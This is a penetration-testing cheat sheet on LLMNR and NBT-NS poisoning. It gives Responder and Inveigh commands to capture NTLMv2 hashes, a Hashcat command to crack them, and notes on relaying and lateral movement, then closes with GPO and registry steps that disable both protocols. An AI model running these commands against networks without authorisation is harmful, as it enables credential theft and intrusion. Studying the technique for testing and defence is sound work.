# LLMNR & NBT-NS Poisoning
**Concept:** When a Windows machine cannot resolve a hostname using DNS (e.g., a user types `\\printserver` instead of `\\printserver.corp.local`), it falls back to multicast protocols: **LLMNR** (Link-Local Multicast Name Resolution) and **NBT-NS** (NetBIOS Name Service). 
**The Attack:** We listen for these broadcasts. When a victim asks "Who is `\\printserver`?", we reply "I am! Authenticate to me." The victim sends us their **NTLMv2 Hash**.

**Note:** You **cannot** Pass-the-Hash with NTLMv2. You must either:
1. **Crack it** (Offline).
2. **Relay it** (SMB Relay / NTLM Relay).
## 1. From Linux (Responder)
**Tool:** `Responder.py` (The industry standard). 
**Context:** You are on a Kali machine inside the network.
### Starting Responder
We typically disable the HTTP/SMB servers in `Responder.conf` if we plan to use `ntlmrelayx.py` later. For simple poisoning/capturing:
```shell
# -I: Interface to listen on (e.g., eth0, ens224)
# -d: DHCP (Analyze only - optional)
# -w: Start WPAD rogue proxy (Aggressive)
sudo responder -I ens224 -w
```
- **Result:** Watch the screen. When a user mistypes a share name or a script tries to access a decommissioned server, you will capture the hash.
### Cracking the Hash (Hashcat)
**Hash Type:** NetNTLMv2. **Hashcat Mode:** `5600`.
```shell
# Syntax: hashcat -m 5600 <hash_file> <wordlist>
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```
## 2. From Windows (Inveigh)
**Tool:** `Inveigh` (PowerShell) or `InveighZero` (C# Binary). 
**Context:** You have compromised a Windows host and want to poison traffic on the local subnet to catch other users (Lateral Movement). 
**Note:** `Inveigh` is safer than Responder on Windows because it doesn't require low-level raw socket access in the same way, though Admin privileges are usually needed to bind to port 445/137.
### PowerShell Version
```powershell
# Import the module
Import-Module .\Inveigh.ps1

# Start Poisoning
# -NBNS Y: Enable NetBIOS spoofing
# -ConsoleOutput Y: Show catches in real-time
# -FileOutput Y: Save to disk
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
### C# Version (InveighZero)
Useful if PowerShell Constrained Language Mode is active.
```powershell
.\Inveigh.exe
```
## 3. Mitigation (Disabling the Protocols)
**Defense:** The only way to stop this is to disable LLMNR and NBT-NS.
### Disable LLMNR (GPO)
- **Policy:** Computer Configuration -> Administrative Templates -> Network -> DNS Client.
- **Setting:** Turn off Multicast Name Resolution -> **Enabled**.
### Disable NBT-NS (PowerShell / Registry)
This must be done per network adapter or via DHCP scope options.
```powershell
# Disable NetBIOS over TCP/IP on all interfaces
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach { 
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```
- _Value 2 = Disabled._